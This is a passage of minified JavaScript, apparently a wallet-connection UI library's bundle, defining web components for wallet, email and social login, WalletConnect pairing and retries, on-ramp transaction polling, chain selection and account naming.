    `}watchTransactions(){if(this.selectedOnRampProvider)switch(this.selectedOnRampProvider.name){case"coinbase":this.startTime=Date.now(),this.initializeCoinbaseTransactions();break}}async initializeCoinbaseTransactions(){await this.watchCoinbaseTransactions(),this.intervalId=setInterval(()=>this.watchCoinbaseTransactions(),4e3)}async watchCoinbaseTransactions(){try{const e=Se.state.address;if(!e)throw new Error("No address found");(await Lt.fetchTransactions({account:e,onramp:"coinbase"})).data.filter(n=>new Date(n.metadata.minedAt)>new Date(this.startTime)||n.metadata.status==="ONRAMP_TRANSACTION_STATUS_IN_PROGRESS").length?(clearInterval(this.intervalId),Ee.replace("OnRampActivity")):this.startTime&&Date.now()-this.startTime>=18e4&&(clearInterval(this.intervalId),this.error=!0)}catch(e){vt.showError(e)}}onTryAgain(){this.selectedOnRampProvider&&(this.error=!1,ke.openHref(this.selectedOnRampProvider.url,"popupWindow","width=600,height=800,scrollbars=yes"))}tryAgainTemplate(){return this.selectedOnRampProvider?.url?F`<wui-button size="md" variant="accent" @click=${this.onTryAgain.bind(this)}>
      <wui-icon color="inherit" slot="iconLeft" name="refresh"></wui-icon>
      Try again
    </wui-button>`:null}loaderTemplate(){const e=Mi.state.themeVariables["--w3m-border-radius-master"],t=e?parseInt(e.replace("px",""),10):4;return F`<wui-loading-thumbnail radius=${t*9}></wui-loading-thumbnail>`}onCopyUri(){if(!this.selectedOnRampProvider?.url){vt.showError("No link found"),Ee.goBack();return}try{ke.copyToClopboard(this.selectedOnRampProvider.url),vt.showSuccess("Link copied")}catch{vt.showError("Failed to copy")}}};bc.styles=MOe;$u([te()],bc.prototype,"intervalId",void 0);$u([te()],bc.prototype,"selectedOnRampProvider",void 0);$u([te()],bc.prototype,"uri",void 0);$u([te()],bc.prototype,"ready",void 0);$u([te()],bc.prototype,"showRetry",void 0);$u([te()],bc.prototype,"buffering",void 0);$u([te()],bc.prototype,"error",void 0);$u([te()],bc.prototype,"startTime",void 0);$u([V({type:Boolean})],bc.prototype,"isMobile",void 0);$u([V()],bc.prototype,"onRetry",void 0);bc=$u([me("w3m-buy-in-progress-view")],bc);const DOe=ge`
  :host {
    --connect-scroll--top-opacity: 0;
    --connect-scroll--bottom-opacity: 0;
    --connect-mask-image: none;
  }

  .connect {
    max-height: clamp(360px, 470px, 80vh);
    scrollbar-width: none;
    overflow-y: scroll;
    overflow-x: hidden;
    transition: opacity var(--wui-ease-out-power-1) var(--wui-duration-md);
    will-change: opacity;
    mask-image: var(--connect-mask-image);
  }

  .guide {
    transition: opacity var(--wui-ease-out-power-1) var(--wui-duration-md);
    will-change: opacity;
  }

  .connect::-webkit-scrollbar {
    display: none;
  }

  .all-wallets {
    flex-flow: column;
  }

  .connect.disabled,
  .guide.disabled {
    opacity: 0.3;
    pointer-events: none;
    user-select: none;
  }

  wui-separator {
    margin: var(--wui-spacing-s) calc(var(--wui-spacing-s) * -1);
    width: calc(100% + var(--wui-spacing-s) * 2);
  }
`;var Ru=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};const LOe=470;let vc=class extends he{constructor(){super(),this.unsubscribe=[],this.connectors=Xe.state.connectors,this.authConnector=this.connectors.find(e=>e.type==="AUTH"),this.features=Ne.state.features,this.enableWallets=Ne.state.enableWallets,this.noAdapters=re.state.noAdapters,this.walletGuide="get-started",this.checked=!1,this.isEmailEnabled=this.features?.email&&!re.state.noAdapters,this.isSocialEnabled=this.features?.socials&&this.features.socials.length>0&&!re.state.noAdapters,this.isAuthEnabled=this.checkIfAuthEnabled(this.connectors),this.unsubscribe.push(Xe.subscribeKey("connectors",e=>{this.connectors=e,this.authConnector=this.connectors.find(t=>t.type==="AUTH"),this.isAuthEnabled=this.checkIfAuthEnabled(this.connectors)}),Ne.subscribeKey("features",e=>this.setEmailAndSocialEnableCheck(e,this.noAdapters)),Ne.subscribeKey("enableWallets",e=>this.enableWallets=e),re.subscribeKey("noAdapters",e=>this.setEmailAndSocialEnableCheck(this.features,e)))}disconnectedCallback(){this.unsubscribe.forEach(t=>t()),this.resizeObserver?.disconnect(),this.shadowRoot?.querySelector(".connect")?.removeEventListener("scroll",this.handleConnectListScroll.bind(this))}firstUpdated(){const e=this.shadowRoot?.querySelector(".connect");e&&(requestAnimationFrame(this.handleConnectListScroll.bind(this)),e?.addEventListener("scroll",this.handleConnectListScroll.bind(this)),this.resizeObserver=new ResizeObserver(()=>{this.handleConnectListScroll()}),this.resizeObserver.observe(e),this.handleConnectListScroll())}render(){const{termsConditionsUrl:e,privacyPolicyUrl:t}=Ne.state,i=Ne.state.features?.legalCheckbox,o=!!(e||t)&&!!i&&this.walletGuide==="get-started"&&!this.checked,a={connect:!0,disabled:o},c=Ne.state.enableWalletGuide,l=this.enableWallets,u=this.isSocialEnabled||this.authConnector,d=o?-1:void 0;return F`
      <wui-flex flexDirection="column">
        ${this.legalCheckboxTemplate()}
        <wui-flex
          data-testid="w3m-connect-scroll-view"
          flexDirection="column"
          class=${Ow(a)}
        >
          <wui-flex
            class="connect-methods"
            flexDirection="column"
            gap="s"
            .padding=${u&&l&&c&&this.walletGuide==="get-started"?["3xs","s","0","s"]:["3xs","s","s","s"]}
          >
            ${this.renderConnectMethod(d)}
          </wui-flex>
        </wui-flex>
        ${this.guideTemplate(o)}
        <w3m-legal-footer></w3m-legal-footer>
      </wui-flex>
    `}setEmailAndSocialEnableCheck(e,t){this.isEmailEnabled=e?.email&&!t,this.isSocialEnabled=e?.socials&&e.socials.length>0&&!t,this.features=e,this.noAdapters=t}checkIfAuthEnabled(e){const t=e.filter(n=>n.type===xn.CONNECTOR_TYPE_AUTH).map(n=>n.chain);return Me.AUTH_CONNECTOR_SUPPORTED_CHAINS.some(n=>t.includes(n))}renderConnectMethod(e){const t=d0.getConnectOrderMethod(this.features,this.connectors);return F`${t.map((i,n)=>{switch(i){case"email":return F`${this.emailTemplate(e)} ${this.separatorTemplate(n,"email")}`;case"social":return F`${this.socialListTemplate(e)}
          ${this.separatorTemplate(n,"social")}`;case"wallet":return F`${this.walletListTemplate(e)}
          ${this.separatorTemplate(n,"wallet")}`;default:return null}})}`}checkMethodEnabled(e){switch(e){case"wallet":return this.enableWallets;case"social":return this.isSocialEnabled&&this.isAuthEnabled;case"email":return this.isEmailEnabled&&this.isAuthEnabled;default:return null}}checkIsThereNextMethod(e){const i=d0.getConnectOrderMethod(this.features,this.connectors)[e+1];return i?this.checkMethodEnabled(i)?i:this.checkIsThereNextMethod(e+1):void 0}separatorTemplate(e,t){const i=this.checkIsThereNextMethod(e),n=this.walletGuide==="explore";switch(t){case"wallet":return this.enableWallets&&i&&!n?F`<wui-separator data-testid="wui-separator" text="or"></wui-separator>`:null;case"email":{const s=i==="social";return this.isAuthEnabled&&this.isEmailEnabled&&!s&&i?F`<wui-separator
              data-testid="w3m-email-login-or-separator"
              text="or"
            ></wui-separator>`:null}case"social":{const s=i==="email";return this.isAuthEnabled&&this.isSocialEnabled&&!s&&i?F`<wui-separator data-testid="wui-separator" text="or"></wui-separator>`:null}default:return null}}emailTemplate(e){return!this.isEmailEnabled||!this.isAuthEnabled?null:F`<w3m-email-login-widget
      walletGuide=${this.walletGuide}
      tabIdx=${ye(e)}
    ></w3m-email-login-widget>`}socialListTemplate(e){return!this.isSocialEnabled||!this.isAuthEnabled?null:F`<w3m-social-login-widget
      walletGuide=${this.walletGuide}
      tabIdx=${ye(e)}
    ></w3m-social-login-widget>`}walletListTemplate(e){const t=this.enableWallets,i=this.features?.emailShowWallets===!1,n=this.features?.collapseWallets,s=i||n;return!t||((ke.isTelegram()||ke.isSafari())&&ke.isIos()&&ft.connectWalletConnect().catch(a=>({})),this.walletGuide==="explore")?null:this.isAuthEnabled&&(this.isEmailEnabled||this.isSocialEnabled)&&s?F`<wui-list-button
        data-testid="w3m-collapse-wallets-button"
        tabIdx=${ye(e)}
        @click=${this.onContinueWalletClick.bind(this)}
        text="Continue with a wallet"
      ></wui-list-button>`:F`<w3m-wallet-login-list tabIdx=${ye(e)}></w3m-wallet-login-list>`}guideTemplate(e=!1){if(!Ne.state.enableWalletGuide)return null;const i={guide:!0,disabled:e},n=e?-1:void 0;return!this.authConnector&&!this.isSocialEnabled?null:F`
      ${this.walletGuide==="explore"&&!re.state.noAdapters?F`<wui-separator data-testid="wui-separator" id="explore" text="or"></wui-separator>`:null}
      <wui-flex flexDirection="column" .padding=${["s","0","xl","0"]} class=${Ow(i)}>
        <w3m-wallet-guide
          tabIdx=${ye(n)}
          walletGuide=${this.walletGuide}
        ></w3m-wallet-guide>
      </wui-flex>
    `}legalCheckboxTemplate(){return this.walletGuide==="explore"?null:F`<w3m-legal-checkbox
      @checkboxChange=${this.onCheckboxChange.bind(this)}
      data-testid="w3m-legal-checkbox"
    ></w3m-legal-checkbox>`}handleConnectListScroll(){const e=this.shadowRoot?.querySelector(".connect");if(!e)return;e.scrollHeight>LOe?(e.style.setProperty("--connect-mask-image",`linear-gradient(
          to bottom,
          rgba(0, 0, 0, calc(1 - var(--connect-scroll--top-opacity))) 0px,
          rgba(200, 200, 200, calc(1 - var(--connect-scroll--top-opacity))) 1px,
          black 40px,
          black calc(100% - 40px),
          rgba(155, 155, 155, calc(1 - var(--connect-scroll--bottom-opacity))) calc(100% - 1px),
          rgba(0, 0, 0, calc(1 - var(--connect-scroll--bottom-opacity))) 100%
        )`),e.style.setProperty("--connect-scroll--top-opacity",C1.interpolate([0,50],[0,1],e.scrollTop).toString()),e.style.setProperty("--connect-scroll--bottom-opacity",C1.interpolate([0,50],[0,1],e.scrollHeight-e.scrollTop-e.offsetHeight).toString())):(e.style.setProperty("--connect-mask-image","none"),e.style.setProperty("--connect-scroll--top-opacity","0"),e.style.setProperty("--connect-scroll--bottom-opacity","0"))}onContinueWalletClick(){Ee.push("ConnectWallets")}onCheckboxChange(e){this.checked=!!e.detail}};vc.styles=DOe;Ru([te()],vc.prototype,"connectors",void 0);Ru([te()],vc.prototype,"authConnector",void 0);Ru([te()],vc.prototype,"features",void 0);Ru([te()],vc.prototype,"enableWallets",void 0);Ru([te()],vc.prototype,"noAdapters",void 0);Ru([V()],vc.prototype,"walletGuide",void 0);Ru([te()],vc.prototype,"checked",void 0);Ru([te()],vc.prototype,"isEmailEnabled",void 0);Ru([te()],vc.prototype,"isSocialEnabled",void 0);Ru([te()],vc.prototype,"isAuthEnabled",void 0);vc=Ru([me("w3m-connect-view")],vc);const UOe=ge`
  @keyframes shake {
    0% {
      transform: translateX(0);
    }
    25% {
      transform: translateX(3px);
    }
    50% {
      transform: translateX(-3px);
    }
    75% {
      transform: translateX(3px);
    }
    100% {
      transform: translateX(0);
    }
  }

  wui-flex:first-child:not(:only-child) {
    position: relative;
  }

  wui-loading-thumbnail {
    position: absolute;
  }

  wui-icon-box {
    position: absolute;
    right: calc(var(--wui-spacing-3xs) * -1);
    bottom: calc(var(--wui-spacing-3xs) * -1);
    opacity: 0;
    transform: scale(0.5);
    transition-property: opacity, transform;
    transition-duration: var(--wui-duration-lg);
    transition-timing-function: var(--wui-ease-out-power-2);
    will-change: opacity, transform;
  }

  wui-text[align='center'] {
    width: 100%;
    padding: 0px var(--wui-spacing-l);
  }

  [data-error='true'] wui-icon-box {
    opacity: 1;
    transform: scale(1);
  }

  [data-error='true'] > wui-flex:first-child {
    animation: shake 250ms cubic-bezier(0.36, 0.07, 0.19, 0.97) both;
  }

  [data-retry='false'] wui-link {
    display: none;
  }

  [data-retry='true'] wui-link {
    display: block;
    opacity: 1;
  }
`;var rh=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let go=class extends he{constructor(){super(),this.wallet=Ee.state.data?.wallet,this.connector=Ee.state.data?.connector,this.timeout=void 0,this.secondaryBtnIcon="refresh",this.onConnect=void 0,this.onRender=void 0,this.onAutoConnect=void 0,this.isWalletConnect=!0,this.unsubscribe=[],this.imageSrc=Nr.getWalletImage(this.wallet)??Nr.getConnectorImage(this.connector),this.name=this.wallet?.name??this.connector?.name??"Wallet",this.isRetrying=!1,this.uri=ft.state.wcUri,this.error=ft.state.wcError,this.ready=!1,this.showRetry=!1,this.secondaryBtnLabel="Try again",this.secondaryLabel="Accept connection request in the wallet",this.buffering=!1,this.isMobile=!1,this.onRetry=void 0,this.unsubscribe.push(ft.subscribeKey("wcUri",e=>{this.uri=e,this.isRetrying&&this.onRetry&&(this.isRetrying=!1,this.onConnect?.())}),ft.subscribeKey("wcError",e=>this.error=e),ft.subscribeKey("buffering",e=>this.buffering=e)),(ke.isTelegram()||ke.isSafari())&&ke.isIos()&&ft.state.wcUri&&this.onConnect?.()}firstUpdated(){this.onAutoConnect?.(),this.showRetry=!this.onAutoConnect}disconnectedCallback(){this.unsubscribe.forEach(e=>e()),clearTimeout(this.timeout)}render(){this.onRender?.(),this.onShowRetry();const e=this.error?"Connection can be declined if a previous request is still active":this.secondaryLabel;let t=`Continue in ${this.name}`;return this.buffering&&(t="Connecting..."),this.error&&(t="Connection declined"),F`
      <wui-flex
        data-error=${ye(this.error)}
        data-retry=${this.showRetry}
        flexDirection="column"
        alignItems="center"
        .padding=${["3xl","xl","xl","xl"]}
        gap="xl"
      >
        <wui-flex justifyContent="center" alignItems="center">
          <wui-wallet-image size="lg" imageSrc=${ye(this.imageSrc)}></wui-wallet-image>

          ${this.error?null:this.loaderTemplate()}

          <wui-icon-box
            backgroundColor="error-100"
            background="opaque"
            iconColor="error-100"
            icon="close"
            size="sm"
            border
            borderColor="wui-color-bg-125"
          ></wui-icon-box>
        </wui-flex>

        <wui-flex flexDirection="column" alignItems="center" gap="xs">
          <wui-text variant="paragraph-500" color=${this.error?"error-100":"fg-100"}>
            ${t}
          </wui-text>
          <wui-text align="center" variant="small-500" color="fg-200">${e}</wui-text>
        </wui-flex>

        ${this.secondaryBtnLabel?F`
              <wui-button
                variant="accent"
                size="md"
                ?disabled=${this.isRetrying||!this.error&&this.buffering}
                @click=${this.onTryAgain.bind(this)}
                data-testid="w3m-connecting-widget-secondary-button"
              >
                <wui-icon color="inherit" slot="iconLeft" name=${this.secondaryBtnIcon}></wui-icon>
                ${this.secondaryBtnLabel}
              </wui-button>
            `:null}
      </wui-flex>

      ${this.isWalletConnect?F`
            <wui-flex .padding=${["0","xl","xl","xl"]} justifyContent="center">
              <wui-link @click=${this.onCopyUri} color="fg-200" data-testid="wui-link-copy">
                <wui-icon size="xs" color="fg-200" slot="iconLeft" name="copy"></wui-icon>
                Copy link
              </wui-link>
            </wui-flex>
          `:null}

      <w3m-mobile-download-links .wallet=${this.wallet}></w3m-mobile-download-links>
    `}onShowRetry(){this.error&&!this.showRetry&&(this.showRetry=!0,this.shadowRoot?.querySelector("wui-button")?.animate([{opacity:0},{opacity:1}],{fill:"forwards",easing:"ease"}))}onTryAgain(){this.buffering||(ft.setWcError(!1),this.onRetry?(this.isRetrying=!0,this.onRetry?.()):this.onConnect?.())}loaderTemplate(){const e=Mi.state.themeVariables["--w3m-border-radius-master"],t=e?parseInt(e.replace("px",""),10):4;return F`<wui-loading-thumbnail radius=${t*9}></wui-loading-thumbnail>`}onCopyUri(){try{this.uri&&(ke.copyToClopboard(this.uri),vt.showSuccess("Link copied"))}catch{vt.showError("Failed to copy")}}};go.styles=UOe;rh([te()],go.prototype,"isRetrying",void 0);rh([te()],go.prototype,"uri",void 0);rh([te()],go.prototype,"error",void 0);rh([te()],go.prototype,"ready",void 0);rh([te()],go.prototype,"showRetry",void 0);rh([te()],go.prototype,"secondaryBtnLabel",void 0);rh([te()],go.prototype,"secondaryLabel",void 0);rh([te()],go.prototype,"buffering",void 0);rh([V({type:Boolean})],go.prototype,"isMobile",void 0);rh([V()],go.prototype,"onRetry",void 0);var jOe=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Wq=class extends go{constructor(){if(super(),this.externalViewUnsubscribe=[],!this.connector)throw new Error("w3m-connecting-view: No connector provided");Ve.sendEvent({type:"track",event:"SELECT_WALLET",properties:{name:this.connector.name??"Unknown",platform:"browser"}}),this.onConnect=this.onConnectProxy.bind(this),this.onAutoConnect=this.onConnectProxy.bind(this),this.isWalletConnect=!1,this.externalViewUnsubscribe.push(re.subscribeKey("activeCaipAddress",e=>{e&&Ut.close()}))}disconnectedCallback(){this.externalViewUnsubscribe.forEach(e=>e())}async onConnectProxy(){try{this.error=!1,this.connector&&(this.connector.id!==Me.CONNECTOR_ID.COINBASE_SDK||!this.error)&&(await ft.connectExternal(this.connector,this.connector.chain),Ve.sendEvent({type:"track",event:"CONNECT_SUCCESS",properties:{method:"browser",name:this.connector.name||"Unknown"}}))}catch(e){Ve.sendEvent({type:"track",event:"CONNECT_ERROR",properties:{message:e?.message??"Unknown"}}),this.error=!0}}};Wq=jOe([me("w3m-connecting-external-view")],Wq);const FOe=ge`
  wui-flex,
  wui-list-wallet {
    width: 100%;
  }
`;var jee=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let E7=class extends he{constructor(){super(),this.unsubscribe=[],this.activeConnector=Xe.state.activeConnector,this.unsubscribe.push(Xe.subscribeKey("activeConnector",e=>this.activeConnector=e))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){return F`
      <wui-flex
        flexDirection="column"
        alignItems="center"
        .padding=${["m","xl","xl","xl"]}
        gap="xl"
      >
        <wui-flex justifyContent="center" alignItems="center">
          <wui-wallet-image
            size="lg"
            imageSrc=${ye(Nr.getConnectorImage(this.activeConnector))}
          ></wui-wallet-image>
        </wui-flex>
        <wui-flex
          flexDirection="column"
          alignItems="center"
          gap="xs"
          .padding=${["0","s","0","s"]}
        >
          <wui-text variant="paragraph-500" color="fg-100">
            Select Chain for ${this.activeConnector?.name}
          </wui-text>
          <wui-text align="center" variant="small-500" color="fg-200"
            >Select which chain to connect to your multi chain wallet</wui-text
          >
        </wui-flex>
        <wui-flex
          flexGrow="1"
          flexDirection="column"
          alignItems="center"
          gap="xs"
          .padding=${["xs","0","xs","0"]}
        >
          ${this.networksTemplate()}
        </wui-flex>
      </wui-flex>
    `}networksTemplate(){return this.activeConnector?.connectors?.map(e=>e.name?F`
            <wui-list-wallet
              imageSrc=${ye(Nr.getChainImage(e.chain))}
              name=${Me.CHAIN_NAME_MAP[e.chain]}
              @click=${()=>this.onConnector(e)}
              data-testid="wui-list-chain-${e.chain}"
            ></wui-list-wallet>
          `:null)}onConnector(e){const t=this.activeConnector?.connectors?.find(i=>i.chain===e.chain);if(!t){vt.showError("Failed to find connector");return}t.id==="walletConnect"?ke.isMobile()?Ee.push("AllWallets"):Ee.push("ConnectingWalletConnect"):Ee.push("ConnectingExternal",{connector:t})}};E7.styles=FOe;jee([te()],E7.prototype,"activeConnector",void 0);E7=jee([me("w3m-connecting-multi-chain-view")],E7);var RC=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let ly=class extends he{constructor(){super(),this.interval=void 0,this.lastRetry=Date.now(),this.wallet=Ee.state.data?.wallet,this.platform=void 0,this.platforms=[],this.isSiwxEnabled=!!Ne.state.siwx,this.determinePlatforms(),this.initializeConnection(),this.interval=setInterval(this.initializeConnection.bind(this),kr.TEN_SEC_MS)}disconnectedCallback(){clearTimeout(this.interval)}render(){return F`
      ${this.headerTemplate()}
      <div>${this.platformTemplate()}</div>
    `}async initializeConnection(e=!1){if(this.platform!=="browser")try{const{wcPairingExpiry:t,status:i}=ft.state;(e||ke.isPairingExpired(t)||i==="connecting")&&(await ft.connectWalletConnect(),this.finalizeConnection(),this.isSiwxEnabled||Ut.close())}catch(t){Ve.sendEvent({type:"track",event:"CONNECT_ERROR",properties:{message:t?.message??"Unknown"}}),ft.setWcError(!0),ke.isAllowedRetry(this.lastRetry)?(vt.showError(t.message??"Declined"),this.lastRetry=Date.now(),this.initializeConnection(!0)):vt.showError(t.message??"Connection error")}}finalizeConnection(){const{wcLinking:e,recentWallet:t}=ft.state;e&&He.setWalletConnectDeepLink(e),t&&He.setAppKitRecent(t),Ve.sendEvent({type:"track",event:"CONNECT_SUCCESS",properties:{method:e?"mobile":"qrcode",name:this.wallet?.name||"Unknown"}})}determinePlatforms(){if(!this.wallet){this.platforms.push("qrcode"),this.platform="qrcode";return}if(this.platform)return;const{mobile_link:e,desktop_link:t,webapp_link:i,injected:n,rdns:s}=this.wallet,o=n?.map(({injected_id:p})=>p).filter(Boolean),a=[...s?[s]:o??[]],c=Ne.state.isUniversalProvider?!1:a.length,l=e,u=i,d=ft.checkInstalled(a),h=c&&d,f=t&&!ke.isMobile();h&&!re.state.noAdapters&&this.platforms.push("browser"),l&&this.platforms.push(ke.isMobile()?"mobile":"qrcode"),u&&this.platforms.push("web"),f&&this.platforms.push("desktop"),!h&&c&&!re.state.noAdapters&&this.platforms.push("unsupported"),this.platform=this.platforms[0]}platformTemplate(){switch(this.platform){case"browser":return F`<w3m-connecting-wc-browser></w3m-connecting-wc-browser>`;case"web":return F`<w3m-connecting-wc-web></w3m-connecting-wc-web>`;case"desktop":return F`
          <w3m-connecting-wc-desktop .onRetry=${()=>this.initializeConnection(!0)}>
          </w3m-connecting-wc-desktop>
        `;case"mobile":return F`
          <w3m-connecting-wc-mobile isMobile .onRetry=${()=>this.initializeConnection(!0)}>
          </w3m-connecting-wc-mobile>
        `;case"qrcode":return F`<w3m-connecting-wc-qrcode></w3m-connecting-wc-qrcode>`;default:return F`<w3m-connecting-wc-unsupported></w3m-connecting-wc-unsupported>`}}headerTemplate(){return this.platforms.length>1?F`
      <w3m-connecting-header
        .platforms=${this.platforms}
        .onSelectPlatfrom=${this.onSelectPlatform.bind(this)}
      >
      </w3m-connecting-header>
    `:null}async onSelectPlatform(e){const t=this.shadowRoot?.querySelector("div");t&&(await t.animate([{opacity:1},{opacity:0}],{duration:200,fill:"forwards",easing:"ease"}).finished,this.platform=e,t.animate([{opacity:0},{opacity:1}],{duration:200,fill:"forwards",easing:"ease"}))}};RC([te()],ly.prototype,"platform",void 0);RC([te()],ly.prototype,"platforms",void 0);RC([te()],ly.prototype,"isSiwxEnabled",void 0);ly=RC([me("w3m-connecting-wc-view")],ly);var Fee=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let zk=class extends he{constructor(){super(...arguments),this.isMobile=ke.isMobile()}render(){if(this.isMobile){const{featured:e,recommended:t}=Ft.state,{customWallets:i}=Ne.state,n=He.getRecentWallets(),s=e.length||t.length||i?.length||n.length;return F`<wui-flex
        flexDirection="column"
        gap="xs"
        .margin=${["3xs","s","s","s"]}
      >
        ${s?F`<w3m-connector-list></w3m-connector-list>`:null}
        <w3m-all-wallets-widget></w3m-all-wallets-widget>
      </wui-flex>`}return F`<wui-flex flexDirection="column" .padding=${["0","0","l","0"]}>
      <w3m-connecting-wc-view></w3m-connecting-wc-view>
      <wui-flex flexDirection="column" .padding=${["0","m","0","m"]}>
        <w3m-all-wallets-widget></w3m-all-wallets-widget> </wui-flex
    ></wui-flex>`}};Fee([te()],zk.prototype,"isMobile",void 0);zk=Fee([me("w3m-connecting-wc-basic-view")],zk);const qOe=ge`
  .continue-button-container {
    width: 100%;
  }
`;var qee=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let _7=class extends he{constructor(){super(...arguments),this.loading=!1}render(){return F`
      <wui-flex
        flexDirection="column"
        alignItems="center"
        gap="xxl"
        .padding=${["0","0","l","0"]}
      >
        ${this.onboardingTemplate()} ${this.buttonsTemplate()}
        <wui-link
          @click=${()=>{ke.openHref(TJ.URLS.FAQ,"_blank")}}
        >
          Learn more about names
          <wui-icon color="inherit" slot="iconRight" name="externalLink"></wui-icon>
        </wui-link>
      </wui-flex>
    `}onboardingTemplate(){return F` <wui-flex
      flexDirection="column"
      gap="xxl"
      alignItems="center"
      .padding=${["0","xxl","0","xxl"]}
    >
      <wui-flex gap="s" alignItems="center" justifyContent="center">
        <wui-icon-box
          icon="id"
          size="xl"
          iconSize="xxl"
          iconColor="fg-200"
          backgroundColor="fg-200"
        ></wui-icon-box>
      </wui-flex>
      <wui-flex flexDirection="column" alignItems="center" gap="s">
        <wui-text align="center" variant="medium-600" color="fg-100">
          Choose your account name
        </wui-text>
        <wui-text align="center" variant="paragraph-400" color="fg-100">
          Finally say goodbye to 0x addresses, name your account to make it easier to exchange
          assets
        </wui-text>
      </wui-flex>
    </wui-flex>`}buttonsTemplate(){return F`<wui-flex
      .padding=${["0","2l","0","2l"]}
      gap="s"
      class="continue-button-container"
    >
      <wui-button
        fullWidth
        .loading=${this.loading}
        size="lg"
        borderRadius="xs"
        @click=${this.handleContinue.bind(this)}
        >Choose name
      </wui-button>
    </wui-flex>`}handleContinue(){Ee.push("RegisterAccountName"),Ve.sendEvent({type:"track",event:"OPEN_ENS_FLOW",properties:{isSmartAccount:Se.state.preferredAccountType===vr.ACCOUNT_TYPES.SMART_ACCOUNT}})}};_7.styles=qOe;qee([te()],_7.prototype,"loading",void 0);_7=qee([me("w3m-choose-account-name-view")],_7);var zOe=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Hq=class extends he{constructor(){super(...arguments),this.wallet=Ee.state.data?.wallet}render(){if(!this.wallet)throw new Error("w3m-downloads-view");return F`
      <wui-flex gap="xs" flexDirection="column" .padding=${["s","s","l","s"]}>
        ${this.chromeTemplate()} ${this.iosTemplate()} ${this.androidTemplate()}
        ${this.homepageTemplate()}
      </wui-flex>
    `}chromeTemplate(){return this.wallet?.chrome_store?F`<wui-list-item
      variant="icon"
      icon="chromeStore"
      iconVariant="square"
      @click=${this.onChromeStore.bind(this)}
      chevron
    >
      <wui-text variant="paragraph-500" color="fg-100">Chrome Extension</wui-text>
    </wui-list-item>`:null}iosTemplate(){return this.wallet?.app_store?F`<wui-list-item
      variant="icon"
      icon="appStore"
      iconVariant="square"
      @click=${this.onAppStore.bind(this)}
      chevron
    >
      <wui-text variant="paragraph-500" color="fg-100">iOS App</wui-text>
    </wui-list-item>`:null}androidTemplate(){return this.wallet?.play_store?F`<wui-list-item
      variant="icon"
      icon="playStore"
      iconVariant="square"
      @click=${this.onPlayStore.bind(this)}
      chevron
    >
      <wui-text variant="paragraph-500" color="fg-100">Android App</wui-text>
    </wui-list-item>`:null}homepageTemplate(){return this.wallet?.homepage?F`
      <wui-list-item
        variant="icon"
        icon="browser"
        iconVariant="square-blue"
        @click=${this.onHomePage.bind(this)}
        chevron
      >
        <wui-text variant="paragraph-500" color="fg-100">Website</wui-text>
      </wui-list-item>
